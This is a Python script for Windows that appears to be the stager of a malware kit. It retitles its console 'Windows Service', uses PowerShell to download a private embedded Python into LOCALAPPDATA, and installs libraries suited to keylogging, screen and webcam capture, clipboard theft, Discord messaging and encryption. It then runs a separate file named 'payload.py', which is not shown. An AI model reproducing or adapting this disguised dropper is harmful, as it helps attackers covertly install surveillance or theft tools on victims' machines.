import os
import getpass
import ctypes
import subprocess
import sys
import zipfile

cwd = os.getcwd()
user = getpass.getuser()

ctypes.windll.kernel32.SetConsoleTitleW("Windows Service")

libs = ["winshell", "pycryptodome", "pywin32", "setuptools", "pyttsx3", "pyperclip", "requests", "discord", "mimetype", "pynput", "pyautogui", "psutil", "opencv-python", "keyboard"]

def embed_python():
    if sys.maxsize > 2**32:
        python_url = "https://www.python.org/ftp/python/3.9.8/python-3.9.8-embed-amd64.zip"
    else:
        python_url = "https://www.python.org/ftp/python/3.9.8/python-3.9.8-embed-win32.zip"

    target_dir = os.path.join(os.getenv('LOCALAPPDATA'), "Python398")
    
    if not os.path.exists(target_dir):
        print("Installing Python 3.9.8 to {}".format(target_dir))
        os.makedirs(target_dir)
        
        zip_path = os.path.join(target_dir, "python398.zip")
        
        download_cmd = f"Invoke-WebRequest -Uri {python_url} -OutFile '{zip_path}'"
        subprocess.run([
            "powershell",
            "-Command", 
            download_cmd
        ], check=True)
            
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(target_dir)
        
        print("Installing Pip...")
        pip_url = "https://bootstrap.pypa.io/get-pip.py"
        pip_path = os.path.join(target_dir, "get-pip.py")
        download_cmd = f"Invoke-WebRequest -Uri {pip_url} -OutFile '{pip_path}'"
        subprocess.run(["powershell", "-Command", download_cmd], check=True)
        
        python_exe = os.path.join(target_dir, "python.exe")
        subprocess.run([python_exe, pip_path], check=True)
        
        pth_file = os.path.join(target_dir, "python39._pth")
        with open(pth_file, "r") as f:
            content = f.read()
        if "#import site" in content:
            content = content.replace("#import site", "import site")
            with open(pth_file, "w") as f:
                f.write(content)
        print("[+] Python 3.9.8 and Pip Successfully Installed!")
        
        for lib in libs:
            print(f"Downloading {lib}")
            subprocess.run([python_exe, "-m", "pip", "-q", "install", lib], shell=True, check=True)
        
    else:
        print("Found Private Environment! Attempting to Run...")
    return os.path.join(target_dir, "python.exe")



target_dir = os.path.join(os.getenv('LOCALAPPDATA'), "Python398")
target_python = os.path.join(target_dir, "python.exe")
if os.path.abspath(sys.executable).lower() != target_python.lower(): 
    print("Started From Global Version {}.{}.{}. Attempting switch private v3.9.8 environement...".format(sys.version_info.major, sys.version_info.minor, sys.version_info.micro))
    python_exe = embed_python()
    try:
        payload = os.path.join(cwd, "payload.py")
        subprocess.check_call([python_exe, payload])
    except subprocess.CalledProcessError as e:
        print("Return code:", e.returncode)
        print("Output:", e.output)

    sys.exit()
else:
    print(f"[+] Up and Running Version {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")